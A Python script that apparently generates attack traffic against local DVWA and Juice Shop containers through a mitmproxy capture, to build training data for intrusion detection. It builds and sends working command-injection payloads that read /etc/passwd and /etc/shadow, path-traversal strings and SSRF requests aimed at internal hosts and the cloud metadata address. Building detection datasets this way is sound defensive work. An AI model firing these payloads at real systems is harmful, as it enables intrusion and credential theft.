"""
generate_attack_traffic_extended.py

Scripted traffic generation for the 3 missing attack classes:
  - Command Injection  (DVWA  /vulnerabilities/exec/)
  - Path Traversal     (DVWA  /vulnerabilities/fi/)
  - SSRF               (Juice Shop  /profile/image/url)

Follows the same pattern as generate_attack_traffic.py / topup_sqli_xss.py:
requests routed through mitmdump on 127.0.0.1:8080 so capture_addon.py logs
every request/response pair to data/captured_traffic/capture_log.jsonl.

Run this WHILE mitmdump -s capture/capture_addon.py is running on port 8080,
and while juice-shop (3000) and dvwa (8081) containers are up.

    mitmdump -s capture/capture_addon.py

Then in a second terminal (venv activated):

    python scripts/generate_attack_traffic_extended.py
"""

import json
import random
import time
from concurrent.futures import ThreadPoolExecutor, TimeoutError as FutureTimeoutError
from pathlib import Path

import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

_EXECUTOR = ThreadPoolExecutor(max_workers=20)


def call_with_hard_timeout(fn, *args, hard_timeout=8, **kwargs):
    """Run fn in a worker thread and give up after hard_timeout seconds no
    matter what fn is doing internally. Used as a belt-and-suspenders wrapper
    around requests calls: requests' own timeout= can fail to fire in some
    proxy-in-the-middle hang scenarios (observed: a stuck SSRF request left
    the whole script silent for 10+ minutes despite timeout=5 being set).
    The underlying thread may keep running after we give up on it, but the
    connection will eventually be torn down by the OS/mitmproxy idle-close,
    and we move on immediately rather than blocking the batch."""
    future = _EXECUTOR.submit(fn, *args, **kwargs)
    try:
        return future.result(timeout=hard_timeout)
    except FutureTimeoutError:
        raise TimeoutError(f"hard timeout ({hard_timeout}s) exceeded")

# --- config ---------------------------------------------------------------

PROXIES = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}
DVWA_BASE = "http://localhost:8081"
JUICE_BASE = "http://localhost:3000"
SESSION_STATE_PATH = Path("data/captured_traffic/_test_session_state.json")

SAMPLES_PER_CLASS = 120  # aim above 100 to survive any later filtering
REQUEST_DELAY_RANGE = (0.15, 0.6)  # seconds, keeps traffic "organic" and gentle on mitmproxy

DVWA_USERNAME = "admin"
DVWA_PASSWORD = "password"


# --- session bootstrap -----------------------------------------------------

def get_dvwa_session() -> requests.Session:
    """Fresh DVWA login + set security=low, self-contained (doesn't depend
    on the exact schema of _test_session_state.json)."""
    s = requests.Session()
    s.proxies.update(PROXIES)
    s.verify = False

    login_page = s.get(f"{DVWA_BASE}/login.php")
    token = _extract_user_token(login_page.text)

    resp = s.post(
        f"{DVWA_BASE}/login.php",
        data={
            "username": DVWA_USERNAME,
            "password": DVWA_PASSWORD,
            "user_token": token,
            "Login": "Login",
        },
        allow_redirects=True,
    )
    if "login.php" in resp.url and "index.php" not in resp.url:
        raise RuntimeError("DVWA login failed — check credentials / container is up on :8081")

    # set security level to low
    sec_page = s.get(f"{DVWA_BASE}/security.php")
    token = _extract_user_token(sec_page.text)
    s.post(
        f"{DVWA_BASE}/security.php",
        data={"security": "low", "seclev_submit": "Submit", "user_token": token},
    )
    print("[dvwa] session established, security=low")
    return s


def _extract_user_token(html: str) -> str:
    marker = "user_token' value='"
    if marker not in html:
        marker = 'user_token" value="'
    if marker not in html:
        return ""
    start = html.index(marker) + len(marker)
    end = html.index("'" if "'" in marker else '"', start)
    return html[start:end]


def get_juice_jwt() -> str:
    """Load JWT saved by setup_test_accounts.py (nested under juice_shop.token);
    fall back to a fresh login if the file/key isn't where we expect."""
    if SESSION_STATE_PATH.exists():
        state = json.loads(SESSION_STATE_PATH.read_text())
        token = state.get("juice_shop", {}).get("token")
        if token:
            print(f"[juice-shop] loaded JWT from {SESSION_STATE_PATH} (juice_shop.token)")
            return token
        print(f"[juice-shop] WARNING: 'juice_shop.token' not found in {SESSION_STATE_PATH}, "
              f"top-level keys present: {list(state.keys())} — falling back to fresh login")

    r = requests.post(
        f"{JUICE_BASE}/rest/user/login",
        json={"email": "vanguardium.tester@example.com", "password": "TestPass123!"},
        proxies=PROXIES,
        verify=False,
    )
    r.raise_for_status()
    token = r.json()["authentication"]["token"]
    print("[juice-shop] fresh login succeeded")
    return token


# --- payload generators ------------------------------------------------

def command_injection_payloads(n: int):
    base_ips = ["127.0.0.1", "8.8.8.8", "192.168.1.1", "10.0.0.1", "1.1.1.1"]
    operators = [";", "&&", "|", "|| ", "%0a", "`", "$()"]
    commands = [
        "whoami", "id", "ls -la", "cat /etc/passwd", "uname -a",
        "cat /etc/shadow", "ifconfig", "ps aux", "hostname", "pwd",
        "cat /etc/hosts", "netstat -an", "sleep 2",
    ]
    payloads = set()
    while len(payloads) < n:
        ip = random.choice(base_ips)
        op = random.choice(operators)
        cmd = random.choice(commands)
        if op == "|":  # high-level bypass needs no space after pipe
            payloads.add(f"{ip}|{cmd}")
        else:
            payloads.add(f"{ip}{op}{cmd}")
    return list(payloads)


def path_traversal_payloads(n: int):
    depths = [3, 4, 5, 6, 8]
    targets = [
        "etc/passwd", "etc/shadow", "etc/hosts", "proc/version",
        "proc/self/environ", "var/log/auth.log", "boot.ini",
        "windows/win32/win.ini",
    ]
    prefixes = ["../", "..%2f", "%2e%2e/", "..\\", "....//"]
    special = [
        "file:///etc/passwd",
        "file:///etc/shadow",
        "php://filter/convert.base64-encode/resource=include.php",
        "http://169.254.169.254/latest/meta-data/",  # RFI-as-SSRF via same module
    ]
    payloads = set(special)
    while len(payloads) < n:
        depth = random.choice(depths)
        prefix = random.choice(prefixes)
        target = random.choice(targets)
        payloads.add((prefix * depth) + target)
    return list(payloads)[:n]


def ssrf_payloads(n: int):
    # Kept to schemes/targets that fail FAST (connection refused / resolvable)
    # rather than hanging (blackholed IPs, gopher://, and other schemes the
    # backend's HTTP client may not time out on internally were removed —
    # they caused multi-minute hangs since Juice Shop's outbound fetch has
    # no timeout of its own, and that hang can outlast our client-side one
    # in edge cases).
    internal_targets = [
        "http://127.0.0.1:8081/",              # DVWA, cross-container from juice-shop's view
        "http://localhost:8081/vulnerabilities/",
        "http://juice-shop:3000/rest/admin/application-version",
        "http://172.17.0.1:8081/",              # common docker bridge gateway
        "http://2130706433/",                   # decimal-encoded 127.0.0.1
        "http://0177.0.0.1/",                   # octal-encoded 127.0.0.1
        "http://0x7f000001/",                   # hex-encoded 127.0.0.1
        "http://localhost:22/",
        "http://localhost:5432/",               # postgres port, per your stack
        "file:///etc/passwd",
    ]
    payloads = list(internal_targets)
    ports = [80, 443, 3000, 5432, 6379, 8080, 8081, 9200, 27017]
    hosts = ["127.0.0.1", "localhost", "172.17.0.1", "juice-shop", "dvwa", "vanguardium_postgres"]
    # exhaust unique host:port combos first, then top up with repeats —
    # the unique pool here is only 10 + 6*9 = 64, well under n=120, so
    # requiring strict uniqueness (a set + while-loop) would spin forever.
    unique_combos = list({f"http://{h}:{p}/" for h in hosts for p in ports} - set(payloads))
    random.shuffle(unique_combos)
    payloads.extend(unique_combos)
    while len(payloads) < n:
        payloads.append(f"http://{random.choice(hosts)}:{random.choice(ports)}/")
    random.shuffle(payloads)
    return payloads[:n]


# --- traffic generation --------------------------------------------------

def generate_command_injection(session: requests.Session):
    print(f"[cmd-injection] generating {SAMPLES_PER_CLASS} samples...")
    ok = 0
    for payload in command_injection_payloads(SAMPLES_PER_CLASS):
        try:
            page = call_with_hard_timeout(session.get, f"{DVWA_BASE}/vulnerabilities/exec/")
            token = _extract_user_token(page.text)
            call_with_hard_timeout(
                session.post,
                f"{DVWA_BASE}/vulnerabilities/exec/",
                data={"ip": payload, "Submit": "Submit", "user_token": token},
            )
            ok += 1
        except (requests.RequestException, TimeoutError) as e:
            print(f"  [!] request failed/timed out: {e}")
        time.sleep(random.uniform(*REQUEST_DELAY_RANGE))
    print(f"[cmd-injection] done: {ok}/{SAMPLES_PER_CLASS} sent")


def generate_path_traversal(session: requests.Session):
    print(f"[path-traversal] generating {SAMPLES_PER_CLASS} samples...")
    ok = 0
    for payload in path_traversal_payloads(SAMPLES_PER_CLASS):
        try:
            call_with_hard_timeout(
                session.get, f"{DVWA_BASE}/vulnerabilities/fi/", params={"page": payload}
            )
            ok += 1
        except (requests.RequestException, TimeoutError) as e:
            print(f"  [!] request failed/timed out: {e}")
        time.sleep(random.uniform(*REQUEST_DELAY_RANGE))
    print(f"[path-traversal] done: {ok}/{SAMPLES_PER_CLASS} sent")


def generate_ssrf(jwt: str):
    print(f"[ssrf] generating {SAMPLES_PER_CLASS} samples...")
    headers = {"Authorization": f"Bearer {jwt}", "Content-Type": "application/json"}
    ok = 0
    for i, payload in enumerate(ssrf_payloads(SAMPLES_PER_CLASS), 1):
        print(f"  ({i}/{SAMPLES_PER_CLASS}) {payload}", flush=True)
        try:
            call_with_hard_timeout(
                requests.post,
                f"{JUICE_BASE}/profile/image/url",
                json={"imageUrl": payload},
                headers=headers,
                proxies=PROXIES,
                verify=False,
                timeout=3,
                hard_timeout=4,
            )
            ok += 1
        except (requests.RequestException, TimeoutError) as e:
            print(f"      [!] failed/timed out: {e}", flush=True)
        time.sleep(random.uniform(*REQUEST_DELAY_RANGE))
    print(f"[ssrf] done: {ok}/{SAMPLES_PER_CLASS} sent")


# --- main ------------------------------------------------------------------

def main():
    print("=" * 60)
    print("Vanguardium — extended attack traffic generation")
    print(f"target: {SAMPLES_PER_CLASS} samples each for cmd-injection, path-traversal, ssrf")
    print("=" * 60)

    dvwa_session = get_dvwa_session()
    generate_command_injection(dvwa_session)
    generate_path_traversal(dvwa_session)

    jwt = get_juice_jwt()
    generate_ssrf(jwt)

    print("\nDone. Now run extract_features.py to re-extract from capture_log.jsonl")
    print("(after you've added the 3 new labeling patterns — step 3).")


if __name__ == "__main__":
    main()
